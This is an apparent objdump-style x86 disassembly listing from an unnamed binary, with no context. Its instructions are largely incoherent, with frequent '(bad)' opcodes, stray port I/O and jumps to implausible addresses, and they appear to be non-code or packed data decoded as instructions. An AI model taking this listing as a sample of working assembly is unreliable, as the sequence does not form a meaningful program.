  429d76:	add    BYTE PTR [ebp+0x8b3255],cl
  429d7c:	cld    
  429d7d:	mov    DWORD PTR [edx],edi
  429d7f:	aam    0x75
  429d81:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  429d87:	mov    DWORD PTR [ebx-0x50],edx
  429d8a:	test   BYTE PTR [ebp-0x1],0xe8
  429d8e:	mov    eax,DWORD PTR [eax]
  429d90:	hlt    
  429d91:	add    al,al
  429d93:	mov    eax,DWORD PTR ds:0x890045a8
  429d99:	dec    DWORD PTR [ebx+0x45fdf0e8]
  429d9f:	inc    DWORD PTR [eax*2+0xf75854d]
  429da6:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  429dac:	call   0x7298faed
  429db1:	je     0x429e11
  429db3:	js     0x429e14
  429db5:	lock ret 0x7e
  429db9:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  429dbf:	mov    edi,edi
  429dc1:	sbb    al,bl
  429dc3:	clc    
  429dc4:	add    BYTE PTR [ebp-0x73],bh
  429dc7:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  429dcd:	ror    BYTE PTR [eax],1
  429dcf:	dec    ebp
  429dd0:	xchg   ebp,eax
  429dd1:	mov    edi,edi
  429dd3:	in     al,0x8b
  429dd5:	jge    0x429d60
  429dd7:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  429ddd:	clc    
  429dde:	pop    esi
  429ddf:	fist   DWORD PTR [ebp+0x5d398b5d]
  429de5:	clc    
  429de6:	add    al,0x6e
  429de8:	mov    eax,DWORD PTR [ebx]
  429dea:	mov    BYTE PTR [ebp+0x0],dl
  429ded:	mov    edx,DWORD PTR [ebx-0x20]
  429df0:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429df6:	add    eax,0x3b3a73
  429dfb:	adc    al,0x89
  429dfd:	pop    eax
  429dfe:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429e02:	ret    0xf08
  429e05:	cmp    al,0x2
  429e07:	mov    DWORD PTR [edx],esi
  429e09:	cld    
  429e0a:	add    BYTE PTR [ebp+0x66],dl
  429e0d:	add    eax,ebx
  429e0f:	add    esp,eax
  429e11:	sub    eax,eax
  429e13:	or     BYTE PTR [ecx-0x77f474bb],cl
  429e19:	add    BYTE PTR [eax],al
  429e1b:	mov    DWORD PTR [ebx-0x24],ebx
  429e1e:	push   edi
  429e1f:	push   ebp
  429e20:	clc    
  429e21:	add    DWORD PTR [esi+0x1b0100],0x45
  429e28:	out    0xff,eax
  429e2a:	add    edx,DWORD PTR [eax]
  429e2c:	jmp    0x429e16
  429e2e:	cmp    ch,0x43
  429e31:	(bad)  
  429e32:	jmp    0x40c82684
  429e37:	je     0x429dc3
  429e39:	mov    eax,DWORD PTR [eax-0x10c78704]
  429e3f:	inc    ebp
  429e40:	add    BYTE PTR [ebx-0x770375],al
  429e46:	add    ah,ch
  429e48:	add    edx,esp
  429e4a:	pop    edi
  429e4b:	pop    ebp
  429e4c:	push   ebp
  429e4d:	inc    ebx
  429e4e:	in     al,dx
  429e4f:	pop    ebp
  429e50:	in     al,dx
  429e51:	cmp    edx,DWORD PTR [edi-0x8]
  429e54:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  429e5b:	add    al,0x47
  429e5d:	push   ebp
  429e5e:	mov    esp,ebp
  429e60:	in     al,0x45
  429e62:	dec    ebp
  429e63:	push   esi
  429e64:	test   DWORD PTR [eax+0xff010f],esi
  429e6a:	add    BYTE PTR [eax+0xc018b],dh
  429e70:	leave  
  429e71:	inc    ebp
  429e72:	test   al,ch
  429e74:	add    dh,bh
  429e76:	add    bh,bh
  429e78:	dec    ebp
  429e79:	push   cs
  429e7a:	mov    DWORD PTR [ecx],eax
  429e7c:	hlt    
  429e7d:	push   es
  429e7e:	dec    ebp
  429e7f:	leave  
  429e80:	mov    DWORD PTR [eax],ecx
  429e82:	clc    
  429e83:	cmovge eax,ecx
  429e86:	mov    ecx,0x85c2f0
  429e8c:	clc    
  429e8d:	pop    DWORD PTR [ebp+0x1]
  429e90:	aas    
  429e91:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  429e98:	push   esi
  429e99:	add    BYTE PTR [ebp-0x4],al
  429e9c:	mov    DWORD PTR [eax],eax
  429e9e:	cld    
  429e9f:	inc    bp
  429ea1:	add    DWORD PTR [edx],edi
  429ea3:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429eab:	mov    ebx,0xcd4f68
  429eb0:	mov    edi,DWORD PTR [ebx]
  429eb2:	or     al,0x75
  429eb4:	(bad)  
  429eb5:	xor    ecx,ebx
  429eb7:	enterw 0x4d01,0x87
  429ebc:	jmp    0x429ec2
  429ec1:	ret    
  429ec2:	inc    ebp
  429ec3:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429ec9:	add    dh,cl
  429ecb:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429ed3:	icebp  
  429ed4:	or     BYTE PTR [eax+0x8f13bd2],al
  429eda:	inc    ebp
  429edb:	inc    edx
  429edc:	mov    ecx,DWORD PTR [edx]
  429ede:	or     al,0xf9
  429ee0:	(bad)  
  429ee1:	jne    0x429eb1
  429ee3:	mov    cl,0x0
  429ee6:	rol    BYTE PTR [esi+0x450134],1
  429eec:	add    eax,edi
  429eee:	cld    
  429eef:	ret    
  429ef0:	dec    ebp
  429ef1:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429ef7:	mov    edi,0xf82c8534
  429efc:	jmp    0x429f7b
  429efe:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429f04:	mov    dl,0x8b
  429f06:	sub    cl,BYTE PTR [eax]
  429f08:	mov    ecx,ecx
  429f0a:	in     al,dx
  429f0b:	test   cl,dh
  429f0d:	add    BYTE PTR [edx],al
  429f0f:	add    BYTE PTR [eax-0x377a97b3],al
  429f15:	cmovge esi,esp
  429f18:	add    eax,DWORD PTR [eax]
  429f1a:	cld    
  429f1b:	mov    eax,DWORD PTR [ecx]
  429f1d:	adc    BYTE PTR [ebp+0x4d],cl
  429f20:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429f26:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429f2c:	cmp    esp,ebx
  429f2e:	jne    0x429ecc
  429f30:	mov    eax,edi
  429f32:	adc    ah,ch
  429f34:	push   ebp
  429f35:	test   DWORD PTR [ebx],esi
  429f37:	clc    
  429f38:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429f3e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429f41:	dec    ebp
  429f42:	adc    bh,al
  429f44:	push   0x8b85ff10
  429f49:	clc    
  429f4a:	or     al,0x50
  429f4c:	(bad)  
  429f4d:	push   ecx
  429f4e:	retf   
  429f4f:	mov    ebx,0xff4d8dc8
  429f54:	mov    DWORD PTR [ebp+0x8],eax
  429f57:	xor    eax,DWORD PTR [ebp-0x75]
  429f5a:	cmp    ebp,DWORD PTR [ebx]
  429f5c:	lsl    ebx,WORD PTR [edi-0x8]
  429f60:	call   DWORD PTR [ebx-0x741bff75]
  429f66:	(bad)  
  429f67:	or     al,0x5b
  429f69:	dec    ebp
  429f6a:	or     BYTE PTR [ebx],dh
  429f6c:	inc    ebp
  429f6d:	xor    esi,DWORD PTR ds:0x708088d
  429f73:	in     eax,0x98
  429f75:	add    BYTE PTR [edx],dh
  429f77:	inc    ebp
  429f78:	pop    edi
  429f79:	xor    eax,edx
  429f7b:	test   DWORD PTR [eax],0x81108b8b
  429f81:	dec    ebp
  429f82:	sub    al,0x33
  429f84:	add    BYTE PTR [ebx],dh
  429f86:	push   esi
  429f87:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429f8d:	mov    edi,eax
  429f8f:	or     BYTE PTR [ebp+0x45],al
  429f92:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429f98:	cmp    cl,cl
  429f9a:	pushf  
  429f9b:	push   es
  429f9c:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429fa3:	dec    ebp
  429fa4:	inc    ebp
  429fa5:	and    BYTE PTR [eax],0x50
  429fa8:	pushf  
  429fa9:	push   0x4de4d1c7
  429fae:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429fb4:	fsubr  st,st(1)
  429fb6:	xlat   BYTE PTR ds:[ebx]
  429fb7:	rol    bh,cl
  429fb9:	mov    edx,esp
  429fbb:	or     BYTE PTR [ebp+0x4588f84d],al
  429fc1:	mov    ecx,DWORD PTR [eax]
  429fc3:	or     BYTE PTR [eax],al
  429fc5:	push   ebp
  429fc6:	mov    edi,DWORD PTR [eax+0xfc728b]
  429fcc:	dec    ebp
  429fcd:	enter  0xceba,0x8
  429fd1:	retf   0x1807
  429fd4:	ret    0x984d
  429fd7:	mov    esi,DWORD PTR [edx]
  429fd9:	or     al,0x33
  429fdb:	into   
  429fdc:	add    edx,esi
  429fde:	add    ecx,edx
  429fe0:	bswap  eax
  429fe2:	ror    esi,0x98
  429fe5:	dec    ebp
  429fe6:	add    cl,ch
  429fe8:	mov    edi,edi
  429fea:	hlt    
  429feb:	inc    esi
  429fed:	inc    ebp
  429fee:	ret    0x4533
  429ff1:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429ff7:	or     BYTE PTR [ebx],dh
  429ff9:	dec    ebp
  429ffa:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  42a000:	jne    0xff8c9fc7
  42a006:	inc    ebp
  42a007:	inc    ebp
  42a008:	mov    esi,DWORD PTR [ebx]
  42a00a:	clc    
  42a00b:	pop    esi
  42a00c:	ret    0xcaeb
  42a00f:	mov    eax,esi
  42a011:	call   0x5203f0e4
  42a016:	dec    ebp
  42a017:	add    eax,0xf8728b
  42a01c:	adc    eax,0xce0ccac9
  42a021:	push   ebp
  42a022:	ret    0xc6ec
  42a025:	in     al,dx
  42a026:	call   0x3342ed2f
  42a02b:	push   edi
  42a02c:	add    edi,eax
  42a02e:	xor    eax,eax
  42a030:	jmp    0x42a077
  42a032:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a038:	add    eax,edi
  42a03a:	shr    eax,cl
  42a03c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a042:	mov    edi,DWORD PTR [ecx]
  42a044:	in     al,dx
  42a045:	pushf  
  42a046:	ret    0x84c7
  42a049:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a04f:	inc    ebp
  42a050:	in     al,dx
  42a051:	cmp    BYTE PTR [ebp-0x64],al
  42a054:	mov    eax,edi
  42a056:	cld    
  42a057:	fmul   st(2),st
  42a059:	sbb    dl,al
  42a05b:	jmp    0x9c3b:0x374d45c1
  42a062:	jbe    0x42a02b
  42a064:	mov    esp,eax
  42a066:	clc    
  42a067:	add    BYTE PTR [ebp+0x0],cl
  42a06a:	mov    ecx,ecx
  42a06c:	lea    eax,[ebp-0x5]
  42a06f:	mov    edi,edi
  42a071:	call   0x51cdf0bb
  42a076:	hlt    
  42a077:	xor    eax,edx
  42a079:	mov    esi,0x987284
  42a07e:	xor    cl,dl
  42a080:	mov    esi,eax
  42a082:	hlt    
  42a083:	into   
  42a084:	inc    ebp
  42a085:	scas   eax,DWORD PTR es:[edi]
  42a086:	mov    ebp,ecx
  42a088:	cld    
  42a089:	add    dl,cl
  42a08b:	add    dl,al
  42a08d:	inc    ebp
  42a08e:	shr    DWORD PTR [ebx],0x4d
  42a091:	xor    edi,DWORD PTR [ebx]
  42a093:	mov    DWORD PTR [edi],ecx
  42a095:	clc    
  42a096:	dec    esi
  42a097:	inc    ebp
  42a098:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a09e:	ret    0xc6ca
  42a0a1:	mov    BYTE PTR [ebp-0x32],0x53
  42a0a5:	scas   eax,DWORD PTR es:[edi]
  42a0a6:	inc    ebp
  42a0a7:	jmp    0x42a0e0
  42a0a9:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a0b0:	pop    ebx
  42a0b1:	xor    ecx,DWORD PTR [ebp+0x3]
  42a0b4:	mov    eax,DWORD PTR [ebx]
  42a0b6:	clc    
  42a0b7:	test   edx,ecx
  42a0b9:	mov    ecx,esi
  42a0bb:	cld    
  42a0bc:	call   0x8ab6e606
  42a0c1:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a0c7:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a0cd:	fdiv   QWORD PTR [ebx]
  42a0cf:	retf   0xce89
  42a0d2:	in     al,0xc1
  42a0d4:	inc    ebp
  42a0d5:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a0db:	into   
  42a0dc:	mov    dh,0xc1
  42a0df:	call   0x8c16e668
  42a0e4:	(bad)  
  42a0e5:	cld    
  42a0e6:	mov    ecx,DWORD PTR [ebp-0x14]
  42a0e9:	xor    eax,ecx
  42a0eb:	lea    eax,[ebp+0x8]
  42a0ee:	mov    esi,DWORD PTR [edx-0x4]
  42a0f1:	add    dl,al
  42a0f3:	inc    ebp
  42a0f4:	mov    esp,0x32d8988b
  42a0f9:	dec    ebp
  42a0fa:	mov    esi,DWORD PTR [ebx]
  42a0fc:	cld    
  42a0fd:	xor    eax,edx
  42a0ff:	sub    ebp,DWORD PTR [eax-0x75]
  42a102:	int    0xec
  42a104:	sub    ecx,eax
  42a106:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a10c:	mov    esi,esp
  42a10e:	call   0x3416ee97
  42a113:	inc    DWORD PTR [ebx]
  42a115:	mov    edi,DWORD PTR [ebx]
  42a117:	cld    
  42a118:	jne    0x42a167
  42a11a:	mov    esi,DWORD PTR [ebx]
  42a11c:	aam    0x8d
  42a11e:	dec    ebp
  42a11f:	or     BYTE PTR [ebx],dh
  42a121:	jb     0x42a126
  42a123:	add    BYTE PTR [edi+0x45],bl
  42a126:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a12d:	xor    ebp,esp
  42a12f:	xor    eax,edi
  42a131:	sub    edi,esp
  42a133:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a139:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a140:	inc    ebp
  42a141:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a147:	clc    
  42a148:	mov    eax,edi
  42a14a:	nop
  42a14b:	fadd   QWORD PTR [eax]
  42a14d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a153:	jmp    0x42a0de
  42a155:	mov    eax,DWORD PTR [ecx]
  42a157:	fadd   DWORD PTR [eax]
  42a159:	inc    ebp
  42a15a:	or     DWORD PTR [ebx],esi
  42a15c:	dec    eax
  42a15d:	add    edx,DWORD PTR [ebx-0x2d]
  42a160:	dec    ebp
  42a161:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a167:	inc    ebp
  42a168:	push   eax
  42a169:	mov    dl,BYTE PTR [ecx-0xd]
  42a16c:	xor    ecx,DWORD PTR [ebp-0x45]
  42a16f:	(bad)  
  42a171:	rol    BYTE PTR [eax],0xc1
  42a174:	ret    
  42a175:	inc    ebp
  42a176:	inc    ebp
  42a177:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a17d:	xor    eax,ebx
  42a17f:	add    eax,DWORD PTR [ebp+0x23]
  42a182:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a188:	cmp    edi,0xc
  42a18b:	dec    ebp
  42a18c:	inc    ebp
  42a18d:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a193:	inc    ebp
  42a194:	mov    esi,DWORD PTR [ebx]
  42a196:	clc    
  42a197:	lea    eax,[ebp+0x45725407]
  42a19d:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a1a1:	xor    edi,DWORD PTR [eax]
  42a1a3:	mov    ecx,0xff8b8d4d
  42a1a8:	push   esp
  42a1a9:	enter  0x4df7,0x23
  42a1ad:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a1b3:	mov    eax,DWORD PTR [ebx]
  42a1b5:	loopne 0x42a1a2
  42a1b7:	ret    0xc68b
  42a1ba:	push   esp
  42a1bb:	enter  0x9745,0x8b
  42a1bf:	inc    ebp
  42a1c0:	cld    
  42a1c1:	mov    eax,edi
  42a1c3:	clc    
  42a1c4:	ret    
  42a1c5:	ret    0xc645
  42a1c8:	mov    esi,DWORD PTR [ebx]
  42a1ca:	cld    
  42a1cb:	pop    esi
  42a1cc:	mov    ebx,0x83458bc3
  42a1d2:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a1d6:	dec    ebp
  42a1d7:	cmp    BYTE PTR [ebx],dh
  42a1d9:	pushf  
  42a1da:	add    edi,DWORD PTR [edx-0x7767a77]
  42a1e0:	fcom   DWORD PTR [ebp+0x45]
  42a1e3:	mov    edi,DWORD PTR [edx]
  42a1e5:	adc    al,0x9c
  42a1e7:	inc    ebp
  42a1e8:	(bad)  
  42a1e9:	mov    ebx,eax
  42a1eb:	adc    al,0x85
  42a1ed:	cmp    al,0x1
  42a1f0:	inc    ebp
  42a1f1:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a1f8:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a1fe:	xor    eax,DWORD PTR [ebx]
  42a200:	add    edi,DWORD PTR [ecx+ecx*4]
  42a203:	mov    esp,esi
  42a205:	clc    
  42a206:	inc    ebp
  42a207:	inc    ebp
  42a208:	add    edx,DWORD PTR [esi+0xc]
  42a20b:	mov    edi,0x7ff0845
  42a210:	in     al,dx
  42a211:	(bad)  
  42a212:	jne    0x42a1ac
  42a214:	mov    esi,DWORD PTR [edx]
  42a216:	clc    
  42a217:	add    ebp,DWORD PTR [edx]
  42a219:	mov    edi,edi
  42a21b:	in     al,dx
  42a21c:	mov    DWORD PTR [ebp-0x10],eax
  42a21f:	xor    eax,DWORD PTR [ebp+0x3]
  42a222:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a228:	fmul   DWORD PTR [ebx-0x173caf39]
  42a22e:	lea    ecx,[ecx+0x45e8d4bc]
  42a234:	clc    
  42a235:	mov    edi,edi
  42a237:	cmp    BYTE PTR [ebp+0x4d],al
  42a23a:	test   DWORD PTR [eax+0x74],ecx
  42a23d:	inc    ecx
  42a23e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a244:	ret    
  42a245:	inc    eax
  42a246:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a24c:	push   eax
  42a24d:	dec    eax
  42a24e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a24f:	sar    bh,1
  42a251:	enter  0x458b,0xec
  42a255:	mov    eax,DWORD PTR [ebp+0x38]
  42a258:	mov    eax,ecx
  42a25a:	fadd   DWORD PTR [ebx]
  42a25c:	dec    ebp
  42a25d:	inc    eax
  42a25e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a264:	inc    ebp
  42a265:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a26b:	fadd   QWORD PTR [ebx]
  42a26d:	inc    ebp
  42a26e:	or     al,0x33
  42a270:	dec    ebp
  42a271:	add    edi,DWORD PTR [ebx]
  42a273:	mov    DWORD PTR [edx-0x28],esi
  42a276:	mov    eax,DWORD PTR [ebp-0x10]
  42a279:	mov    eax,DWORD PTR [eax+0x10]
  42a27c:	mov    eax,edi
  42a27e:	lock ret 
  42a280:	inc    ecx
  42a281:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a287:	fsubr  st,st(5)
  42a289:	test   DWORD PTR [eax],eax
  42a28b:	clc    
  42a28c:	push   0x45
  42a28e:	(bad)  
  42a28f:	cmp    ebp,esp
  42a291:	pushf  
  42a292:	inc    ebp
  42a293:	(bad)  
  42a294:	push   eax
  42a295:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a299:	clc    
  42a29a:	mov    eax,0xf8008584
  42a29f:	mov    eax,DWORD PTR [ebp-0x4]
  42a2a2:	mov    edi,0x4585c3cc
  42a2a8:	clc    
  42a2a9:	mov    eax,DWORD PTR [ebp+0x14]
  42a2ac:	cmp    al,BYTE PTR [ebp-0x64]
  42a2af:	mov    edi,eax
  42a2b1:	in     al,dx
  42a2b2:	les    esi,FWORD PTR [ebp-0x7b]
  42a2b5:	mov    edi,eax
  42a2b7:	or     al,0x4d
  42a2b9:	dec    ebp
  42a2ba:	mov    eax,ebp
  42a2bc:	in     al,0xf2
  42a2be:	dec    ebp
  42a2bf:	dec    DWORD PTR [ecx+0x4dc7e045]
  42a2c5:	fmul   DWORD PTR [ecx+0x4df8f085]
  42a2cb:	inc    ebp
  42a2cc:	mov    DWORD PTR [ebx],esi
  42a2ce:	fadd   QWORD PTR [ebx]
  42a2d0:	dec    ebp
  42a2d1:	push   eax
  42a2d2:	xor    eax,DWORD PTR [ebp+0x3]
  42a2d5:	push   eax
  42a2d6:	mov    DWORD PTR [eax],ebx
  42a2d8:	fdivr  st,st(7)
  42a2da:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42a2e1:	dec    esi
  42a2e2:	clc    
  42a2e3:	inc    ebp
  42a2e4:	test   BYTE PTR [ebx],dh
  42a2e6:	add    DWORD PTR [ebx],eax
  42a2e8:	add    BYTE PTR [eax+0x4d],dl
  42a2eb:	jne    0x42a320
  42a2ed:	lea    ecx,[ebx-0x7617fc44]
  42a2f3:	div    ah
  42a2f5:	inc    DWORD PTR [ebp+0x45]
  42a2f8:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42a2fe:	jb     0x42a28b
  42a300:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42a307:	mov    ecx,DWORD PTR [ebp-0x10]
  42a30a:	xor    ecx,DWORD PTR [ebp+0x3]
  42a30d:	mov    edi,DWORD PTR [ebx]
  42a30f:	adc    BYTE PTR [ebp+0x41],dh
  42a312:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42a318:	ret    
  42a319:	push   ss
  42a31a:	push   0x45
  42a31c:	lea    ecx,[ebx+0x4de80cb0]
  42a322:	sti    
  42a323:	add    edi,edi
  42a325:	or     BYTE PTR [ebp+0x4d],al
  42a328:	mov    ebp,DWORD PTR [ebx]
  42a32a:	xor    ebp,ecx
  42a32c:	mov    al,BYTE PTR [edx]
  42a32e:	add    eax,0xc7200
  42a333:	jne    0x42a382
  42a335:	lea    esi,[ebx]
  42a337:	mov    al,0xf
  42a339:	call   0xe99fe
  42a33e:	sar    DWORD PTR [eax],0x84
  42a341:	pushf  
  42a342:	add    DWORD PTR [ecx+0x4545d000],ecx
  42a348:	mov    edi,DWORD PTR [ecx]
  42a34a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42a351:	test   DWORD PTR [eax],eax
  42a353:	clc    
  42a354:	dec    ebp
  42a355:	inc    ebp
  42a356:	xor    edi,DWORD PTR [ebx]
  42a358:	setl   al
  42a35b:	(bad)  
  42a35c:	retf   
  42a35d:	rol    cl,1
  42a35f:	dec    ebp
  42a360:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42a366:	inc    ebp
  42a367:	lea    ecx,[ebx-0x75b2cc38]
  42a36d:	lea    eax,ds:0x4d72c4
  42a373:	mov    ecx,DWORD PTR [ebp-0x4]
  42a376:	xor    ecx,edi
  42a378:	bswap  ebx
  42a37a:	ror    BYTE PTR [ebp-0x35],0xe9
  42a37e:	rol    DWORD PTR [ecx],0x84
  42a381:	add    BYTE PTR [ecx],al
  42a383:	cmp    al,BYTE PTR [eax]
  42a385:	pushf  
  42a386:	inc    ebp
  42a387:	jnp    0x8a42d78a
  42a38d:	mov    eax,DWORD PTR ds:0xcf72e8
  42a393:	lock dec ebp
  42a395:	retf   
  42a396:	xor    ecx,DWORD PTR [ebp+0xf]
  42a399:	mov    eax,eax
  42a39b:	fmul   st,st(3)
  42a39d:	test   ecx,0x1988484
  42a3a3:	xor    al,BYTE PTR [eax]
  42a3a5:	mov    DWORD PTR [ebp-0x28],eax
  42a3a8:	mov    eax,DWORD PTR [ebp+0x33]
  42a3ab:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42a3b1:	ret    
  42a3b2:	add    al,cl
  42a3b4:	dec    ebp
  42a3b5:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42a3bb:	add    ecx,DWORD PTR ds:0xc7250
  42a3c1:	inc    ebp
  42a3c2:	rcl    DWORD PTR [eax+0x4d],0x27
  42a3c6:	mov    edi,edi
  42a3c8:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42a3ce:	jb     0x42a397
  42a3d0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42a3d7:	mov    esi,DWORD PTR [ebx]
  42a3d9:	cld    
  42a3da:	mov    cl,bh
  42a3dc:	or     eax,0x372b6
  42a3e1:	cmp    ecx,eax
  42a3e3:	jne    0x42a460
  42a3e9:	mov    eax,DWORD PTR [ebp-0x20]
  42a3ec:	mov    eax,DWORD PTR [eax]
  42a3ee:	xor    eax,edi
  42a3f0:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42a3f7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3fa:	mov    ecx,edi
  42a3fc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a402:	jb     0x42a413
  42a404:	add    BYTE PTR [edi-0x3f],dl
  42a407:	add    BYTE PTR [ebp-0x75],cl
  42a40a:	mov    esi,eax
  42a40c:	xor    eax,DWORD PTR [eax]
  42a40e:	mov    al,bh
  42a410:	or     eax,0x487284
  42a415:	xor    al,cl
  42a417:	mov    ecx,DWORD PTR [ebp-0x4]
  42a41a:	mov    ecx,edi
  42a41c:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a422:	jb     0x42a433
  42a424:	add    BYTE PTR [edi],dh
  42a426:	enter  0x8500,0x8b
  42a42a:	add    ah,bl
  42a42c:	add    BYTE PTR [eax],al
  42a42e:	inc    ebp
  42a42f:	(bad)  
  42a430:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  42a437:	mov    esi,DWORD PTR [edx-0x4]
  42a43a:	add    bh,cl
  42a43c:	dec    ebp
  42a43d:	mov    dh,0x8b
  42a43f:	add    esi,DWORD PTR [ebx]
  42a441:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42a447:	add    BYTE PTR [eax],al
  42a449:	mov    eax,ecx
  42a44b:	loopne 0x42a49a
  42a44d:	add    BYTE PTR [ebx-0x757bcc39],cl
  42a453:	dec    eax
  42a454:	or     eax,0x8b7232
  42a459:	in     al,0xc1
  42a45b:	or     DWORD PTR [ebp-0x31],ecx
  42a45e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42a465:	xor    dh,BYTE PTR [edx-0x75]
  42a468:	add    al,dh
  42a46a:	enter  0x4f09,0xcf
  42a46e:	inc    ebp
  42a46f:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42a475:	or     al,BYTE PTR ds:0xe4728b
  42a47b:	or     DWORD PTR [ebp-0x31],ecx
  42a47e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42a485:	cmp    dh,BYTE PTR [edx+0xf]
  42a488:	add    bl,dl
  42a48a:	rol    DWORD PTR [eax],0x4d
  42a48d:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42a493:	(bad)  
  42a494:	or     eax,0x487284
  42a499:	xor    al,cl
  42a49b:	mov    ecx,DWORD PTR [ebp-0x20]
  42a49e:	mov    ecx,DWORD PTR [ecx]
  42a4a0:	xor    ecx,edi
  42a4a2:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a4a9:	xor    cl,al
  42a4ab:	mov    ecx,DWORD PTR [edi]
  42a4ad:	fadd   QWORD PTR [ebp+0x9]
  42a4b0:	call   0xffcf9f84
  42a4b5:	dec    eax
  42a4b6:	dec    ebp
  42a4b7:	xor    bh,BYTE PTR [ebx]
  42a4b9:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a4bd:	loopne 0x42a4bb
  42a4bf:	or     edi,eax
  42a4c1:	iret   
  42a4c2:	ret    
  42a4c3:	mov    WORD PTR [ebp+0x4c],es
  42a4c6:	mov    esi,DWORD PTR [edx]
  42a4c8:	call   0x84526c07
  42a4cd:	(bad)  
  42a4ce:	cwde   
  42a4cf:	add    BYTE PTR [edx],dh
  42a4d1:	mov    esi,DWORD PTR [ebx]
  42a4d3:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a4d9:	test   BYTE PTR [ebx],dh
  42a4db:	dec    eax
  42a4dc:	add    esi,DWORD PTR [edx]
  42a4de:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a4e4:	dec    edi
  42a4e6:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a4ed:	xor    al,BYTE PTR [ebx]
  42a4ef:	mov    edi,DWORD PTR [ebx]
  42a4f1:	in     al,0x75
  42a4f3:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a4f9:	dec    eax
  42a4fa:	xor    esi,DWORD PTR [edx]
  42a4fc:	lea    ecx,[edx]
  42a4fe:	or     BYTE PTR [ebx+0x900f072],cl
  42a504:	ja     0x42a4d5
  42a506:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a50d:	cmp    ch,al
  42a50f:	jne    0x42a504
  42a511:	mov    edi,edi
  42a513:	fadd   QWORD PTR [ebp+0x0]
  42a516:	mov    eax,edi
  42a518:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a51f:	mov    edx,DWORD PTR [ebx]
  42a521:	in     al,0x45
  42a523:	or     DWORD PTR [ebx],esi
  42a525:	iret   
  42a526:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a52d:	xor    dl,BYTE PTR [eax-0x75]
  42a530:	sbb    al,ah
  42a532:	dec    DWORD PTR [ecx]
  42a534:	mov    ecx,edi
